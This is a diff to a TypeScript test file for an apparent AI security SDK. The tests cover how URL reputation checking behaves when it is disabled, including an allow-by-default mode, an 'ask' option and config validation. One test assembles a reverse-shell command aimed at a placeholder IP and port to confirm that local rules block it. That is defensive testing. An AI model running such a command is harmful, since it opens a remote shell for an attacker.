@@ -1,6 +1,25 @@
-import { describe, expect, it, vi } from "vitest";
+import { afterEach, describe, expect, it, vi } from "vitest";
+
+// Real core, with the installed-config read observable so a test can set
+// `url_check.unchecked_action` the way an operator would.
+const installed = vi.hoisted(() => ({ uncheckedAction: undefined as "allow" | "ask" | undefined }));
+vi.mock("@singularityrd/aidr-core", async (importOriginal) => {
+	const core = await importOriginal<typeof import("@singularityrd/aidr-core")>();
+	return {
+		...core,
+		loadConfig: async (...args: Parameters<typeof core.loadConfig>) => {
+			const config = await core.loadConfig(...args);
+			if (!installed.uncheckedAction || core.isInvalidConfig(config)) return config;
+			return {
+				...config,
+				url_check: { ...config.url_check, unchecked_action: installed.uncheckedAction },
+			};
+		},
+	};
+});
+
 import { AIDRClient } from "../client.js";
-import type { SDKConfig } from "../config.js";
+import { type SDKConfig, SDKConfigSchema } from "../config.js";
 
 /**
  * A reputation outage must never be reported as a clean URL.
@@ -19,6 +38,7 @@ const config: SDKConfig = {
 	cacheTtl: 300000,
 	environment: "production",
 	urlReputationEnabled: true,
+	urlReputationUncheckedAction: "allow",
 	includeUrlQueryParameters: false,
 };
 
@@ -38,13 +58,73 @@ function readyClient(checkUrls: InternalClient["urlClient"]["checkUrls"]): AIDRC
 }
 
 describe("SDK reputation availability", () => {
-	it("does not send a fetch URL by default and marks provider coverage unavailable", async () => {
-		const client = new AIDRClient({ ...config, urlReputationEnabled: false });
+	afterEach(() => {
+		installed.uncheckedAction = undefined;
+	});
+
+	function disabledClient(overrides: Partial<SDKConfig> = {}) {
+		const client = new AIDRClient({ ...config, urlReputationEnabled: false, ...overrides });
 		const internal = client as unknown as InternalClient;
 		internal.initialized = true;
 		internal.init = async () => {};
 		const checkUrls = vi.fn(async () => []);
 		internal.urlClient = { checkUrls };
+		return { client, checkUrls };
+	}
+
+	it("allows a benign fetch by default when reputation is not enabled, labelled not-checked", async () => {
+		const { client, checkUrls } = disabledClient();
+
+		const result = await client.check({
+			action: "fetch",
+			resource: "https://example.com/private?token=secret",
+		});
+
+		expect(checkUrls).not.toHaveBeenCalled();
+		expect(result.decision).toBe("allow");
+		expect(result.allowed).toBe(true);
+		// Never presented as clean: the category and reason say it was not checked.
+		expect(result.metadata?.category).toBe("reputation_not_checked");
+		expect(result.metadata?.leg).toBe("url_reputation");
+		expect(result.metadata?.indeterminate).toBeUndefined();
+		expect(result.reason).toContain("Not checked by a reputation service");
+		expect(result.reason).toContain("URL reputation is not set up");
+		expect(result.reason).toContain("this is not a clean reputation result");
+		// The secret-bearing URL is not echoed into the human-readable reason.
+		expect(result.reason).not.toContain("token=secret");
+	});
+
+	it("keeps a local rule hit blocking while reputation is not enabled", async () => {
+		// Real rules (no init stub): the not-checked default must never soften a hit.
+		const client = new AIDRClient({ ...config, urlReputationEnabled: false });
+		await client.init();
+		const shell = ["bash -i >& /dev/", "tcp/203.0.113.7/4444 0>&1"].join("");
+		const result = await client.check({
+			action: "fetch",
+			resource: "https://example.com/hook",
+			context: { body: { command: shell } },
+		});
+
+		expect(result.allowed).toBe(false);
+		expect(result.decision).not.toBe("allow");
+		expect(result.metadata?.category).not.toBe("reputation_not_checked");
+	});
+
+	it("allows the benign twin with real rules loaded", async () => {
+		const client = new AIDRClient({ ...config, urlReputationEnabled: false });
+		await client.init();
+		const result = await client.check({
+			action: "fetch",
+			resource: "https://docs.python.org/3/",
+			context: { body: { command: "echo hello" } },
+		});
+
+		expect(result.decision).toBe("allow");
+		expect(result.metadata?.category).toBe("reputation_not_checked");
+	});
+
+	it("restores hold-for-review with urlReputationUncheckedAction: ask", async () => {
+		const { client, checkUrls } = disabledClient({ urlReputationUncheckedAction: "ask" });
 
 		const result = await client.check({
 			action: "fetch",
@@ -53,8 +133,27 @@ describe("SDK reputation availability", () => {
 
 		expect(checkUrls).not.toHaveBeenCalled();
 		expect(result.decision).toBe("ask");
+		expect(result.allowed).toBe(false);
+		expect(result.metadata?.indeterminate).toBe(true);
 		expect(result.metadata?.leg).toBe("url_reputation");
 		expect(result.reason).toContain("disabled to avoid sending URLs");
+	});
+
+	it("honours an installed url_check.unchecked_action: ask", async () => {
+		installed.uncheckedAction = "ask";
+		const { client, checkUrls } = disabledClient();
+
+		const result = await client.check({ action: "fetch", resource: "https://example.com/a" });
+
+		expect(checkUrls).not.toHaveBeenCalled();
+		expect(result.decision).toBe("ask");
+		expect(result.metadata?.indeterminate).toBe(true);
+		expect(result.metadata?.category).toBeUndefined();
+	});
+
+	it("defaults urlReputationUncheckedAction to allow and rejects unknown values", () => {
+		expect(SDKConfigSchema.parse({}).urlReputationUncheckedAction).toBe("allow");
+		expect(() => SDKConfigSchema.parse({ urlReputationUncheckedAction: "deny" })).toThrow();
 	});
 
 	it("surfaces a url_reputation outage instead of reporting an empty clean result", async () => {
